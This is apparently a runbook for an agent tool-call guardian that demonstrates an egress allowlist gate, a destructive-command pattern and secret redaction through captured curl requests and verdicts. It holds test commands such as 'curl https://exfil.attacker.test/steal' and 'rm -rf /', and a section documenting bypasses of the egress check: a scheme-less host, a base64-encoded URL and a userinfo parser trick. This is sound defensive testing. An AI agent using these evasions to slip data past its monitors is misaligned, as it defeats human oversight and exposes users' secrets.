# V9 demo runbook: one egress gate, reached two ways

**The demo, in words.** Ask for a web fetch of a host the allowlist does not cover, and AGT's
stock `egress` gate denies it. Ask for the same destination over `curl`, and the same rule denies
again. One gate, one reason code, one unforked bundle — and two entirely different routes to it.

**Two routes, and they are two claims rather than one.** On the fetch, the destination is already
on the ACS wire: the tool's own `url` argument, which the assembler unwraps into the snapshot, and
which is the **first** entry in the destination path list AGT's own gate declares. Nothing
translates and nothing is originated — the gate reads a field ACS already carries. On the shell
command, the destination is not on the wire at all: what the wire carries is a command line, and
turning that into a host is work the Guardian does. It answers at
`["annotations", "egress", "destination"]`, the last of the five paths the same gate declares. So
one half is *AGT's gate reading ACS's own field*, and the other is *AGT's gate reading something
this deployment originated*. A demo that showed only one of them would be claiming the other for
free.

This runbook is written from real runs against this tree. **Nothing below is composed or
hand-edited: every block is pasted from an actual run.**

## Which build produced these blocks

Commit `16a3ab0`, the last commit of this slice's implementation. Every capture below was taken
against a Guardian started from that tree, on **port 8791** — its own port, not the default `8787`
— so nothing here can be a reading of a longer-lived process holding an older manifest. A Guardian
loads its manifest once, at construction; a capture taken against a stale one would show pre-slice
behaviour while claiming to demonstrate this slice.

**Two subsections of §5 are later, and say so where they appear.** The blocks under *A URL the gate
itself mis-parses* and *Every shell command that mentions a URL* were captured during this branch's
final review round, against a Guardian started the same way from a later commit of this tree, on
**port 8794**. They are the only blocks in this file taken from a different process, and one of
them measures a change to `annotateEgressDestination` that `16a3ab0` does not contain — which is
exactly why they are not presented as if they came from the run above.

## Prerequisites

- `bun` installed, `bun install` run once at the repo root.
- This repo cloned with its submodule.
- `curl` and `jq`.
- For the one block the ACS wire cannot carry (the policy input itself), a way to run a short
  `.ts` file with `bun run` from the repo root. That block says so where it appears.
- The tracked `policy/lib/data.json` and `policy/manifest.yaml` exactly as committed. **No file is
  edited between sections of this runbook** — unlike the V3 runbook, which had to swap config
  documents between verdicts, everything here comes from one committed configuration.

## Setup common to every section

```bash
ACS_GUARDIAN_PORT=8791 ACS_ENVELOPE_LOG=.acs/v9-runbook.jsonl \
  ACS_SESSION_CONTEXT_LOG=.acs/v9-runbook-context.jsonl bun run guardian
```

Captured:

```
$ bun run packages/guardian/src/main.ts
Guardian listening at http://localhost:8791/acs
Envelope log: .acs/v9-runbook.jsonl
Session context log: .acs/v9-runbook-context.jsonl
Failure posture: proceed   (override with ACS_ON_DECISION_FAILURE=deny)
```

Every `curl` below was run against that process. All ten requests were then re-run against a
second Guardian process started the same way from the same tree, and the two captured outputs were
compared with `diff`: identical. Every `request_id` is a fixed literal in the request body, so
byte-identity is a meaningful comparison here rather than an accident of formatting.

## 1. The half with no code at all

`policy/lib/egress.rego` declares where it will look for a destination, and its **first** entry is
the fetch tool's own argument:

```rego
default_destination_paths := [
	["snapshot", "tool_call", "args", "url"],
	["snapshot", "tool_call", "args", "endpoint"],
	["snapshot", "tool_call", "args", "host"],
	["snapshot", "tool_call", "args", "domain"],
	["annotations", "egress", "destination"],
]
```

`assemblePreToolCallSnapshot` already unwraps every ACS `arguments.<k>.value` into
`tool_call.args.<k>`, and did so before this slice began — the loop is there unchanged in
`be5ab38`. So for a tool whose ACS arguments name a `url`, the wire and the gate already agree,
and there is nothing in between them to write.

**The whole of what turned this gate on:**

```bash
git diff be5ab38..HEAD -- policy/lib/data.json
```

```diff
diff --git a/policy/lib/data.json b/policy/lib/data.json
index 1787ea9..13ac0b7 100644
--- a/policy/lib/data.json
+++ b/policy/lib/data.json
@@ -2,6 +2,9 @@
   "agt": {
     "defaults": {
       "config": {
+        "egress": {
+          "allowlist": ["*.anthropic.com", "docs.example.com"]
+        },
         "patterns": {
           "patterns": [
             "(?i)rm\\s+-[a-z]*r[a-z]*f[a-z]*\\s+/(?:\\s|$)",
```

One key. `be5ab38` is this slice's last commit before any code existed.

**The allowed fetch.**

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"0a2f1c34-9d5e-4b71-8c62-1f0e7a5d3b91","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"WebFetch"},"arguments":{"url":{"value":"https://docs.anthropic.com/x"}}}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "0a2f1c34-9d5e-4b71-8c62-1f0e7a5d3b91",
    "decision": "allow"
  }
}
```

**The denied fetch.** Same command, same Guardian; only the `url` differs.

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"1b3e2d45-8c6f-4a92-9d73-2e1f8b6c4a02","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"WebFetch"},"arguments":{"url":{"value":"https://exfil.attacker.test/steal"}}}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "1b3e2d45-8c6f-4a92-9d73-2e1f8b6c4a02",
    "decision": "deny",
    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
    "reason_codes": [
      "egress_destination_not_allowed"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "egress_destination_not_allowed"
      }
    ]
  }
}
```

The allowlist AGT names in its own message is the one the diff above added, verbatim. The second
entry, `docs.example.com`, is deliberately inert: it is there so a reader can see the key is a
*list* and has an obvious slot to edit.

**What this half is and is not, precisely.** *Deciding* about a fetch's destination cost no code:
the loop that unwraps `arguments.<k>.value` into `tool_call.args.<k>` is present unchanged in
`be5ab38`, before a line of this slice existed, no Rego was authored, and the diff above is the
whole of what turned the gate on. *Getting a fetch call as far as being decided about* is a
different problem, and it is what this slice's code is for. Two things had to be true first, and
neither is egress-specific: `policy/manifest.yaml`'s `tools:` registry has to name `WebFetch`, or
AGT fails the call closed on `runtime_error:tool_unknown` before any rule runs; and
`mapping.yaml`'s `policy_target_argument.by_tool` has to say which of that tool's arguments the
shared policy-target leaf is copied from. Measured — a second Guardian, started from the same tree
and the same manifest but pointed at a copy of `mapping.yaml` with the two fetch rows deleted, so
the tool falls back to `default: command`:

```json
{"jsonrpc":"2.0","id":1,"result":{"type":"final","acs_version":"0.1.0","request_id":"0a2f1c34-9d5e-4b71-8c62-1f0e7a5d3b91","decision":"deny","reasoning":"mapping.yaml reads tool \"WebFetch\"'s policy target from argument \"command\", but this call sent no such argument (it sent: url)","reason_codes":["evaluation_failed"],"policy_references":[]}}
```

A deny, and a benign call. So the honest split is: the gate is configuration, and the second tool
shape is code.

## 2. The half that needs a Guardian

A shell command's destination is not an argument. The wire carries `command`
(`curl https://exfil.attacker.test/steal`) and, since this slice, ACS's own `raw_command` beside
it — the verbatim command line, which ACS v0.1.0 has always typed and no hookmap declared until
now.

**Why the gate cannot simply be pointed at the command line.** `host_of()` in
`policy/lib/egress.rego` has two branches, and both of them answer *something* for a whole command
line. Measured by calling the rule directly, through the OPA binary the pinned SDK ships:

```bash
OPA=node_modules/.bun/agent-control-specification-opa-darwin-arm64@0.3.1-beta.0/node_modules/agent-control-specification-opa-darwin-arm64/bin/opa
for s in 'echo hi' 'ls -la /tmp' 'curl https://evil.test/x' 'curl https://docs.anthropic.com/x' 'curl https://docs.anthropic.com; ls'; do
  out=$("$OPA" eval -d policy/lib/egress.rego -f raw "data.agt.egress.host_of(\"$s\")")
  printf '%-46s -> %s\n' "host_of(\"$s\")" "\"$out\""
done
```

```
host_of("echo hi")                             -> "echo hi"
host_of("ls -la /tmp")                         -> "ls -la "
host_of("curl https://evil.test/x")            -> "evil.test"
host_of("curl https://docs.anthropic.com/x")   -> "docs.anthropic.com"
host_of("curl https://docs.anthropic.com; ls") -> "docs.anthropic.com; ls"
```

Against the shipped allowlist, only the fourth of those is allowed. Read them in order and the
three separate reasons extraction is a real step fall out. `split(url, "://")[1]` is everything
*after* the scheme, so a URL bounded by a `/` survives being embedded in a command — that is the
case that works, and it is the only one. The **second branch**, for strings containing no `://`,
returns the command's own leading word, so a forwarded command line *always* resolves a
destination; no allowlist pattern matches a command line, so every benign shell step would be
denied. And where nothing bounds the host on the right, trailing shell text is swallowed into it,
turning an allowlisted destination into a denial.

So the Guardian extracts the first absolute http(s) URL out of `raw_command` and answers at the
gate's own last declared path. `annotateEgressDestination` is the whole of that code, and it
answers `{destination}` or `{}` — never a throw, and never `null`.

**The denied command.**

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"2c4f3e56-7b5a-4c83-8e94-3f2a9c7d5b13","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://exfil.attacker.test/steal"}},"raw_command":"curl https://exfil.attacker.test/steal"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "2c4f3e56-7b5a-4c83-8e94-3f2a9c7d5b13",
    "decision": "deny",
    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
    "reason_codes": [
      "egress_destination_not_allowed"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "egress_destination_not_allowed"
      }
    ]
  }
}
```

Byte for byte the same `reasoning`, `reason_codes` and `policy_references` as the fetch above. Same
rule, different provenance.

**The allowed command.**

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":4,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"3d5a4f67-6c4b-4d74-9fa5-4a3b8d6e2c24","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com/x"}},"raw_command":"curl https://docs.anthropic.com/x"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "3d5a4f67-6c4b-4d74-9fa5-4a3b8d6e2c24",
    "decision": "allow"
  }
}
```

### The destination arriving at the gate's own declared path

The two blocks above are decisions, and a decision is all the ACS wire carries. Taking on trust
that the destination reached the gate at the address the gate declares would be exactly the kind
of claim this repository does not make, so here is the policy input itself.

**This section used a short script rather than `curl`, and that is stated here rather than
disguised.** `POST /acs` answers with an ACS decision; AGT's policy input is a different document,
and the bridge exposes it through `evaluateWithEvidence`, which the conformance harness uses and
the Guardian's own decision path does not. The script below builds the snapshot exactly the way
the Guardian's `evaluateStep` builds it — same mapping table, same argument resolution, same
assembler — and evaluates it through `createDeploymentBridge`, the one function `startGuardian`
itself calls to construct its bridge. Saved at the repo root and run with `bun run`:

```ts
import { createDeploymentBridge } from "guardian/deployment";
import {
  assemblePreToolCallSnapshot,
  createMemorySessionContextStore,
  isToolCallRequest,
  loadMapping,
  resolveInterventionPoint,
  resolvePolicyTargetArgument,
  supplySourceLabels,
  validateEnvelope,
} from "guardian";

const mapping = loadMapping("mapping.yaml");
const bridge = createDeploymentBridge("policy/manifest.yaml");
const store = createMemorySessionContextStore();

async function show(command: string): Promise<void> {
  const envelope = validateEnvelope({
    jsonrpc: "2.0",
    id: 1,
    method: "steps/toolCallRequest",
    params: {
      acs_version: "0.1.0",
      request_id: "2c4f3e56-7b5a-4c83-8e94-3f2a9c7d5b13",
      timestamp: "2026-08-18T00:00:00Z",
      metadata: { agent_id: "demo", session_id: "5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75" },
      payload: { tool: { name: "Bash" }, arguments: { command: { value: command } }, raw_command: command },
    },
  });
  if (!isToolCallRequest(envelope)) throw new Error("not a tool-call request");

  const point = resolveInterventionPoint(envelope.method, mapping);
  const argument = resolvePolicyTargetArgument(mapping, point, envelope.params.payload.tool.name);
  const snapshot = assemblePreToolCallSnapshot(
    envelope,
    supplySourceLabels(store, envelope.params.metadata.session_id),
    argument,
  );
  const evidence = await bridge.evaluateWithEvidence(point, snapshot);
  const policyInput = evidence.policyInput as Record<string, unknown>;

  console.log(`raw_command        ${JSON.stringify(command)}`);
  console.log(`input.annotations  ${JSON.stringify(policyInput.annotations)}`);
  console.log(`verdict            ${JSON.stringify(evidence.verdict)}`);
  console.log("");
}

await show("curl https://exfil.attacker.test/steal");
await show("curl https://docs.anthropic.com/x");
await show("echo hi");
```

Captured:

```
raw_command        "curl https://exfil.attacker.test/steal"
input.annotations  {"egress":{"destination":"https://exfil.attacker.test/steal"}}
verdict            {"decision":"deny","reason":"egress_destination_not_allowed","message":"destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"]"}

raw_command        "curl https://docs.anthropic.com/x"
input.annotations  {"egress":{"destination":"https://docs.anthropic.com/x"}}
verdict            {"decision":"allow","result_labels":["public"]}

raw_command        "echo hi"
input.annotations  {"egress":{}}
verdict            {"decision":"allow","result_labels":["public"]}
```

Three things a reader can check here rather than believe. The destination lands at
`input.annotations.egress.destination` — one of the five entries in the `default_destination_paths`
array quoted at the top of this file, published by AGT and not invented on this side. The verdict
the gate reaches from it is the same verdict the wire
carried in the two `curl` captures above, `message` and all. And the third row is the answer for a
command with no destination in it: `{}`, not an error and not a guess — which is the subject of
section 5.

### What the manifest had to say for this to happen at all

Two blocks in `policy/manifest.yaml`, and one property of them is worth stating because it is
counterintuitive and was measured rather than assumed:

```yaml
annotators:
  egress:
    type: classifier
```

```yaml
    annotations:
      egress:
        from: "$.tool_call.raw_command"
```

`from` is a **liveness precondition, not a projection.** AGT resolves that path before anything
else and denies the whole call on `runtime_error:path_missing` if it does not resolve — with the
annotator never dispatched. And the value it resolves is *not* what the annotator receives: the
dispatcher is handed AGT's entire preliminary policy input and reads the command out of it by
name. So the path has to name a snapshot member that is *always* present, which is why
`assemblePreToolCallSnapshot` writes `raw_command` on every request snapshot, as the empty string
when the wire carried none. A path that could be absent for some tool would make every call by
that tool a total deny.

The same measurement is why the Guardian supplies its annotator dispatcher unconditionally: a
manifest that declares an annotator, evaluated by a bridge built without a dispatcher, answers
`deny runtime_error:annotation_failed` for `echo hi` as readily as for a `curl` — a total deny
wearing a runtime-error reason.

## 3. The four gate classes on one leaf

Both tools' policy targets are now copied into **one** synthetic snapshot leaf,
`tool_call.args.acs_policy_target`, because AGT's manifest schema gives an intervention point
exactly one `policy_target` and resolves it before any rule runs. That means a URL and a shell
command land in the same place, and rules written for one see the other. Whether that is safe had
to be measured, not assumed.

Four of AGT's nine stock gate classes are live under the shipped `policy/lib/data.json`: `ifc`,
`patterns`, `redact`, and — as of this slice — `egress`. Six rows, all against the one committed
manifest and the one committed config, all on the same Guardian:

| Tool | Policy target | Decision | `reason_codes` |
|---|---|---|---|
| `Bash` | `echo hi` | `allow` | *(none)* |
| `Bash` | `rm -rf /` | `deny` | `destructive_shell_command_blocked` |
| `Bash` | `curl https://exfil.attacker.test/steal` | `deny` | `egress_destination_not_allowed` |
| `Bash` | `curl https://docs.anthropic.com/x` | `allow` | *(none)* |
| `WebFetch` | `https://docs.anthropic.com/x` | `allow` | *(none)* |
| `WebFetch` | `https://exfil.attacker.test/steal` | `deny` | `egress_destination_not_allowed` |

Four of the six are captured in full above. The two that are not:

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":5,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"4e6b5a78-5d3c-4e65-8ab6-5b4c7e5f3d35","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"rm -rf /"}},"raw_command":"rm -rf /"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "4e6b5a78-5d3c-4e65-8ab6-5b4c7e5f3d35",
    "decision": "deny",
    "reasoning": "This command was blocked because it matches a destructive-shell-command pattern. Policy: destructive_shell_command_blocked, from AGT's stock bundle (agt_stock). Matched at offset 0.",
    "reason_codes": [
      "destructive_shell_command_blocked"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "destructive_shell_command_blocked"
      }
    ]
  }
}
```

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":6,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"5f7c6b89-4e2d-4f56-9bc7-6c5d8f4a2e46","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"echo hi"}},"raw_command":"echo hi"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 6,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "5f7c6b89-4e2d-4f56-9bc7-6c5d8f4a2e46",
    "decision": "allow"
  }
}
```

**No gate produced a false positive in either direction, in these six rows.** The
destructive-shell patterns did not fire on any of the four rows carrying a URL, and the egress gate
did not fire on either of the two shell commands carrying no destination. Stated as what was seen
rather than as a property: six rows against one configuration is a measurement, not a proof, and a
seventh input could still find a case where a URL matches a shell pattern or a command matches a
host glob.

## 4. The redaction that used to land on the wrong argument

AGT's `transform` names the leaf it rewrote by the literal `$policy_target`. ACS expresses that as
`modifications.parameter_overrides`, keyed by **argument name**. So the argument a policy target is
read *from* and the argument an override is written *to* are the same argument — and until this
slice, `mapping.yaml` declared them separately: `policy_target_argument` did not exist, and an
`into_argument: command` literal answered the second question for every tool.

With one governed tool the two could not disagree. With two they can, and here is the disagreement,
run rather than described. `packages/guardian/src/map-verdict.ts` and `mapping.yaml` were taken
verbatim out of `be5ab38` — this slice's last commit before any code — and handed the real AGT
verdict this build produces for a `WebFetch` whose url carries a token:

```
AGT verdict                       {"decision":"transform","reason":"redaction_applied","transform":{"path":"$policy_target","value":"https://docs.anthropic.com/?t=[REDACTED]"}}
pre-slice mapVerdict + mapping    {"decision":"modify","reasoning":"A secret in this command was replaced before it ran. Policy: redaction_applied, from AGT's stock bundle (agt_stock).","reason_codes":["redaction_applied"],"policy_references":[{"policy_id":"agt_stock","rule_id":"redaction_applied"}],"modifications":{"parameter_overrides":{"command":"https://docs.anthropic.com/?t=[REDACTED]"}}}
the url the tool would still send "https://docs.anthropic.com/?t=ghp_ABCDEF123456"
```

An override keyed by `command`, which `WebFetch` has no argument for, while `url` — still carrying
the token — is what the tool would have gone on to send. A modification reported applied while the
original is delivered. The captured line also carries the second half of the same defect: *"A
secret in this **command** was replaced"*, which is the sentence a model reads, about a fetch that
has no command.

What ships now, captured:

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":7,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"6a8d7c9a-3f1e-4a67-8cd8-7d6e9a5b3f57","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"WebFetch"},"arguments":{"url":{"value":"https://docs.anthropic.com/?t=ghp_ABCDEF123456"}}}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 7,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "6a8d7c9a-3f1e-4a67-8cd8-7d6e9a5b3f57",
    "decision": "modify",
    "reasoning": "A secret in this step's arguments was replaced before it ran. Policy: redaction_applied, from AGT's stock bundle (agt_stock).",
    "reason_codes": [
      "redaction_applied"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "redaction_applied"
      }
    ],
    "modifications": {
      "parameter_overrides": {
        "url": "https://docs.anthropic.com/?t=[REDACTED]"
      }
    }
  }
}
```

`parameter_overrides.url`, and no `command` key at all. The same declaration, read for the shell
tool, still produces the shell tool's own argument:

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":8,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"7b9e8daa-2a0f-4b78-9de9-8e7f0b6c4a68","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"echo ghp_ABCDEF123456"}},"raw_command":"echo ghp_ABCDEF123456"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 8,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "7b9e8daa-2a0f-4b78-9de9-8e7f0b6c4a68",
    "decision": "modify",
    "reasoning": "A secret in this step's arguments was replaced before it ran. Policy: redaction_applied, from AGT's stock bundle (agt_stock).",
    "reason_codes": [
      "redaction_applied"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "redaction_applied"
      }
    ],
    "modifications": {
      "parameter_overrides": {
        "command": "echo [REDACTED]"
      }
    }
  }
}
```

One entry in `mapping.yaml`, read twice — once to tell the assembler which argument to copy into
the shared leaf, once to tell `mapVerdict` which argument to key the override by. Two declarations
of one fact are two things that can disagree; one cannot.

Both of these rows also depend on the allowlist, and not obviously. AGT ranks an egress deny
**above** a redact transform, so a `docs.anthropic.com` URL only reaches the redact rule because
`*.anthropic.com` is in the allowlist. Narrow that entry and this section stops showing a
redaction and starts showing an egress deny.

## 5. What this does not catch

The demo's shape invites the reading that egress is now covered. It is not, and there are **three**
measured directions to state, not one. The first is the failure direction of the extractor: **a
command the extractor cannot parse is unexamined, not denied.** The two subsections after it are
the other two — a URL the *gate* mis-parses, which is worse than a miss, and the over-blocking this
allowlist produces on any shell command that merely mentions a URL.

`destination(rules)` is `undefined` when none of the five declared paths resolves, so the gate
returns no verdict at all and the call falls through to the other gates. The extractor answers
`{}` rather than throwing, deliberately: AGT turns any annotator failure into
`runtime_error:annotation_failed`, which denies *every* call in the deployment, benign ones
included. A detector's misses are allows.

Two commands that reach the same host the section-2 capture denied, both allowed:

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":9,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"8ca09ebb-1b10-4c89-8efa-9f801c7d5b79","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl exfil.attacker.test/steal"}},"raw_command":"curl exfil.attacker.test/steal"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 9,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "8ca09ebb-1b10-4c89-8efa-9f801c7d5b79",
    "decision": "allow"
  }
}
```

```bash
curl -s -X POST http://localhost:8791/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":10,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"9db1afcc-0c21-4d9a-9f0b-a0912d8e6c8a","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl $(echo aHR0cHM6Ly9leGZpbC5hdHRhY2tlci50ZXN0L3N0ZWFs | base64 -d)"}},"raw_command":"curl $(echo aHR0cHM6Ly9leGZpbC5hdHRhY2tlci50ZXN0L3N0ZWFs | base64 -d)"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 10,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "9db1afcc-0c21-4d9a-9f0b-a0912d8e6c8a",
    "decision": "allow"
  }
}
```

The first is not even obfuscation — `curl` supplies the scheme itself, and the extractor is
scheme-anchored on purpose: a bare-host pattern would match package names, file paths and flag
values, and every false positive there is a denial of a step nobody meant to govern. The second is
the base64 of the same URL the section-2 capture denied, and it decodes at run time to exactly
that string. Both are allowed, both would reach the host, and both are shown here rather than
asserted.

### A URL the gate itself mis-parses — and only one of the two routes could be closed

Everything above is the *extractor's* miss direction: a URL it never finds is a URL nobody decided
about. This is a different and worse class, and it is the single input that most undermines the
sentence at the top of this file. Here the extractor finds the URL exactly right, hands it over,
and **the gate mis-parses it**. A reader who has absorbed "misses are allows" still believes that a
URL which *reaches* the gate is decided about, and for this shape that belief is wrong.

`host_of()` takes the substring after the scheme, cuts it at the first `/`, cuts *that* at the
first `:`, and calls what is left the host. A URL's userinfo sits before an `@` and may contain a
`:`. Measured, through the same OPA binary the block in section 2 used:

```bash
OPA=node_modules/.bun/agent-control-specification-opa-darwin-arm64@0.3.1-beta.0/node_modules/agent-control-specification-opa-darwin-arm64/bin/opa
for u in 'https://exfil.attacker.test/steal' 'https://docs.anthropic.com@exfil.attacker.test/steal' 'https://docs.anthropic.com:pw@exfil.attacker.test/steal'; do
  out=$("$OPA" eval -d policy/lib/egress.rego -f raw "data.agt.egress.host_of(\"$u\")")
  printf '%-63s -> %s\n' "host_of(\"$u\")" "\"$out\""
done
```

```
host_of("https://exfil.attacker.test/steal")                    -> "exfil.attacker.test"
host_of("https://docs.anthropic.com@exfil.attacker.test/steal") -> "docs.anthropic.com@exfil.attacker.test"
host_of("https://docs.anthropic.com:pw@exfil.attacker.test/steal") -> "docs.anthropic.com"
```

The third row is the whole finding. `docs.anthropic.com:pw@exfil.attacker.test` splits at the `:`
into `docs.anthropic.com`, which `*.anthropic.com` covers — so the gate allows a request that goes
to `exfil.attacker.test`. **This parser is AGT's**, in the vendored bundle `bun run verify:pin`
holds byte-identical; it is not this side's code and not a defect this deployment introduced.

**The blocks in this subsection and the next were captured after the rest of this file**, against a
Guardian started the same way from a later commit of this tree, on **port 8794** rather than 8791 —
a fresh process on its own port, for the same reason the setup section names a port at all.
Substitute whichever port your own Guardian printed.

```bash
ACS=http://localhost:8794/acs
ask() {  # ask <request_id> <json payload>
  jq -cn --arg r "$1" --argjson p "$2" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
    acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
    metadata:{agent_id:"demo",session_id:"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},payload:$p}}' |
  curl -s -X POST "$ACS" -H 'content-type: application/json' -d @- | jq -r '.result.decision'
}
n=0
for u in 'https://exfil.attacker.test/steal' \
         'https://docs.anthropic.com@exfil.attacker.test/steal' \
         'https://docs.anthropic.com:pw@exfil.attacker.test/steal'; do
  n=$((n+1))
  fetch=$(ask "e0000000-0000-4000-8000-00000000000$n" "$(jq -cn --arg u "$u" '{tool:{name:"WebFetch"},arguments:{url:{value:$u}}}')")
  shell=$(ask "e0000000-0000-4000-8000-00000000010$n" "$(jq -cn --arg u "$u" '{tool:{name:"Bash"},arguments:{command:{value:("curl "+$u)}},raw_command:("curl "+$u)}')")
  printf '%-55s  fetch: %-5s | shell: %s\n' "$u" "$fetch" "$shell"
done
```

```
https://exfil.attacker.test/steal                        fetch: deny  | shell: deny
https://docs.anthropic.com@exfil.attacker.test/steal     fetch: deny  | shell: deny
https://docs.anthropic.com:pw@exfil.attacker.test/steal  fetch: allow | shell: deny
```

**The shell route is closed here. The fetch route is not, and the asymmetry is not an oversight.**

On the shell route, the Guardian *chooses* the string it hands the gate: `raw_command` is a command
line, and `annotateEgressDestination` decides what destination to answer with. It now removes any
userinfo before answering, so `host_of()` resolves the host the request actually reaches. That is a
correction to this side's own input, not to AGT's parser. The verdict, in full:

```bash
curl -s -X POST http://localhost:8794/acs \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":202,"method":"steps/toolCallRequest","params":{"acs_version":"0.1.0","request_id":"bb000002-0000-4000-8000-000000000002","timestamp":"2026-08-18T00:00:00Z","metadata":{"agent_id":"demo","session_id":"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},"payload":{"tool":{"name":"Bash"},"arguments":{"command":{"value":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}},"raw_command":"curl https://docs.anthropic.com:pw@exfil.attacker.test/steal"}}}' | jq .
```

```json
{
  "jsonrpc": "2.0",
  "id": 202,
  "result": {
    "type": "final",
    "acs_version": "0.1.0",
    "request_id": "bb000002-0000-4000-8000-000000000002",
    "decision": "deny",
